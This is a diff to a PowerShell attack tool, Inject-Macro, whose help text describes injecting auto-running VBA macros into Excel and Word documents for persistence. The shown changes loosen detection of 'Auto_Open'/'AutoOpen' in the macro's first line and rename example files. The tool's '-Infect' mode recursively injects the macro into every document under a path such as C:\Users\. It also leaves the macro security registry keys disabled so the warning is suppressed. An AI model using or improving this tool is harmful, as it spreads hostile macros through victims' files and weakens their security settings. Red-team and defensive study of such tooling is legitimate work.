@@ -17,7 +17,7 @@ Ideally this would be used to establish a low level form of persistence.
 
 If the '-Infect' flag is given, the supplied VBA macro code will be injected into all Excel or Word documents in the specified '-Doc' directory path.
 
-The script will read the first line of the supplied VBA macro code and look for 'Sub Auto_Open()' or 'Sub AutoOpen()'. Excel uses 'Sub Auto_Open()' to automatically run macro code when the documet is opened; Word uses 'Sub AutoOpen()'. This will determine if the VBA macro code will be injected into Excel or Word documents.
+The script will read the first line of the supplied VBA macro code and look for 'Auto_Open' or 'AutoOpen'. Excel uses 'Sub Auto_Open()' to automatically run macro code when the documet is opened; Word uses 'Sub AutoOpen()'. This will determine if the VBA macro code will be injected into Excel or Word documents.
 
 The VBA 'Security' registry keys are not re-enabled on exit when the '-Infect' flag is given, which removes the 'Macros have been disabled.' warning.
 
@@ -43,27 +43,27 @@ Remove the VBA macro code from all Excel or Word documents that were injected wi
 
 .EXAMPLE
 
-C:\PS> Inject-Macro -Doc C:\Users\Test\Excel.xls -Macro C:\temp\Excel_Macro.vba
+C:\PS> Inject-Macro -Doc C:\Users\Test\Excel.xls -Macro C:\temp\excel_macro
 
 Description
 -----------
-Inject the VBA macro 'Excel_Macro.vba' into the Excel document 'Excel.xls'
+Inject the VBA macro 'excel_macro' into the Excel document 'Excel.xls'
 
 .EXAMPLE
 
-C:\PS> Inject-Macro -Doc C:\Users\Test\Word.doc -Macro C:\temp\Word_Macro.vba
+C:\PS> Inject-Macro -Doc C:\Users\Test\Word.doc -Macro C:\temp\word_macro
 
 Description
 -----------
-Injects the VBA macro 'Word_Macro.vba' into the Word document 'Word.doc'
+Injects the VBA macro 'word_macro' into the Word document 'Word.doc'
 
 .EXAMPLE
 
-C:\PS> Inject-Macro -Doc C:\Users\ -Macro C:\temp\Macro.vba -Infect
+C:\PS> Inject-Macro -Doc C:\Users\ -Macro C:\temp\macro -Infect
 
 Description
 -----------
-Injects the VBA macro 'Macro.vba' into all Excel or Word documents found in 'C:\Users\' recursively.
+Injects the VBA macro 'macro' into all Excel or Word documents found in 'C:\Users\' recursively.
 
 .EXAMPLE
 
@@ -285,11 +285,11 @@ Removes the VBA macro code from all documents found in 'inject.log'.
 	} elseif ($PSBoundParameters['Infect']) {
 		if (Test-Path $Doc -pathType container) {
 			# Get first line of VBA code
-			$VBAStart = Get-Content $Macro -totalcount 1
-			if ($VBAStart -eq 'Sub Auto_Open()') {
+			$VBAStart = (Get-Content $Macro -totalcount 1).ToLower()
+			if ($VBAStart -match 'auto_open') {
 				Write-Host 'Injecting Excel documents with macro...'
 				$Documents = Get-ChildItem -Path $Doc -include *.xls -recurse
-			} elseif ($VBAStart -eq 'Sub AutoOpen()') {
+			} elseif ($VBAStart -match 'autoopen') {
 				Write-Host 'Injecting Word documents with macro...'
 				$Documents = Get-ChildItem -Path $Doc -include *.doc -recurse
 			} else {
